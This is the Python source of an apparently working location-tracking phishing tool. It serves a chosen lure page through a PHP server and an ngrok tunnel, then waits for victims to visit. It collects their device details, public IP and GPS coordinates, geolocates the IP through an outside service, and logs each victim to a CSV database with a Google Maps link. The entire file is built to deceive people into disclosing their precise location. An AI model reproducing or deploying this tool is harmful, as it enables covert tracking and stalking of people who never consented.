R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
B = '\033[1m'
I = "\033[3m"

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp
from pyngrok import ngrok

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')

args = parser.parse_args()
kml_fname = args.kml

port = "8080"

def template_select():
    global site, info, result
    print(G + '[+]' + C + ' Select a Template : ' + W + '\n')

    with open('template/templates.json', 'r') as templ:
        templ_info = templ.read()

    templ_json = json.loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)

    selected = int(input(G + '[>] ' + W))

    try:
        site = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
        sys.exit()

    print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)

    module = templ_json['templates'][selected]['module']
    if module == True:
        imp_file = templ_json['templates'][selected]['import_file']
        import importlib
        importlib.import_module('template.{}'.format(imp_file))
    else:
        pass

    info = 'template/{}/php/info.txt'.format(site)
    result = 'template/{}/php/result.txt'.format(site)


def server():
    print('\n' + G + '[+]' + C + ' Port : ' + W + str(port))
    print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
    with open('logs/php.log', 'w') as phplog:
        subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog,
                   stderr=phplog)
        time.sleep(3)
    try:
        php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
        php_sc = php_rqst.status_code
        if php_sc == 200:
            print(C + '[' + G + ' Success ' + C + ']' + W)
        else:
            print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)

    except requests.ConnectionError:
        print(C + '[' + R + ' Failed ' + C + ']' + W)
        Quit()

def start_ngrok():
    url = ngrok.connect(8080)
    print(f'\n{G} [>]{C} {url} {W}')


def wait():
    printed = False
    while True:
        time.sleep(2)
        size = os.path.getsize(result)
        if size == 0 and printed == False:
            print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
            printed = True
        if size > 0:
            main()




def main():
    global info, result, row, var_lat, var_lon
    try:
        row = []
        with open(info, 'r') as file2:
            file2 = file2.read()
            json3 = json.loads(file2)
            for value in json3['dev']:

                var_os = value['os']
                var_platform = value['platform']
                try:
                    var_cores = value['cores']
                except TypeError:
                    var_cores = 'Not Available'
                var_ram = value['ram']
                var_vendor = value['vendor']
                var_render = value['render']
                var_res = value['wd'] + 'x' + value['ht']
                var_browser = value['browser']
                var_ip = value['ip']

                row.append(var_os)
                row.append(var_platform)
                row.append(var_cores)
                row.append(var_ram)
                row.append(var_vendor)
                row.append(var_render)
                row.append(var_res)
                row.append(var_browser)
                row.append(var_ip)

                print(G + '[+]' + C + ' Device Information : ' + W + '\n')
                print(G + '[+]' + C + ' OS         : ' + W + var_os)
                print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
                print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
                print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
                print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
                print(G + '[+]' + C + ' GPU        : ' + W + var_render)
                print(G + '[+]' + C + ' Resolution : ' + W + var_res)
                print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
                print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)

                rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
                sc = rqst.status_code

                if sc == 200:
                    data = rqst.text
                    data = json.loads(data)
                    var_continent = str(data['continent'])
                    var_country = str(data['country'])
                    var_region = str(data['region'])
                    var_city = str(data['city'])
                    var_org = str(data['org'])
                    var_isp = str(data['isp'])

                    row.append(var_continent)
                    row.append(var_country)
                    row.append(var_region)
                    row.append(var_city)
                    row.append(var_org)
                    row.append(var_isp)

                    print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
                    print(G + '[+]' + C + ' Country    : ' + W + var_country)
                    print(G + '[+]' + C + ' Region     : ' + W + var_region)
                    print(G + '[+]' + C + ' City       : ' + W + var_city)
                    print(G + '[+]' + C + ' Org        : ' + W + var_org)
                    print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
    except ValueError:
        pass

    try:
        with open(result, 'r') as file:
            file = file.read()
            json2 = json.loads(file)
            for value in json2['info']:
                var_lat = value['lat'] + ' deg'
                var_lon = value['lon'] + ' deg'
                var_acc = value['acc'] + ' m'

                var_alt = value['alt']
                if var_alt == '':
                    var_alt = 'Not Available'
                else:
                    var_alt == value['alt'] + ' m'

                var_dir = value['dir']
                if var_dir == '':
                    var_dir = 'Not Available'
                else:
                    var_dir = value['dir'] + ' deg'

                var_spd = value['spd']
                if var_spd == '':
                    var_spd = 'Not Available'
                else:
                    var_spd = value['spd'] + ' m/s'

                row.append(var_lat)
                row.append(var_lon)
                row.append(var_acc)
                row.append(var_alt)
                row.append(var_dir)
                row.append(var_spd)

                print('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
                print(G + '[+]' + C + ' Latitude  : ' + W + var_lat)
                print(G + '[+]' + C + ' Longitude : ' + W + var_lon)
                print(G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
                print(G + '[+]' + C + ' Altitude  : ' + W + var_alt)
                print(G + '[+]' + C + ' Direction : ' + W + var_dir)
                print(G + '[+]' + C + ' Speed     : ' + W + var_spd)
    except ValueError:
        error = file
        print('\n' + R + '[-] ' + W + error)
        repeat()

    print(
        '\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(
            ' deg') + '+' + var_lon.strip(' deg'))

    if kml_fname is not None:
        kmlout(var_lat, var_lon)

    csvout()
    repeat()


def kmlout(var_lat, var_lon):
    with open('template/sample.kml', 'r') as kml_sample:
        kml_sample_data = kml_sample.read()

    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))


def csvout():
    global row
    with open('db/results.csv', 'a') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(row)
    print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')


def clear():
    global result
    with open(result, 'w+'): pass
    with open(info, 'w+'): pass


def repeat():
    clear()
    wait()
    main()


def Quit():
    global result
    with open(result, 'w+'): pass
    os.system('pkill php')
    exit()


try:
    template_select()
    server()
    start_ngrok()
    wait()
    main()

except KeyboardInterrupt:
    print('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
    Quit()
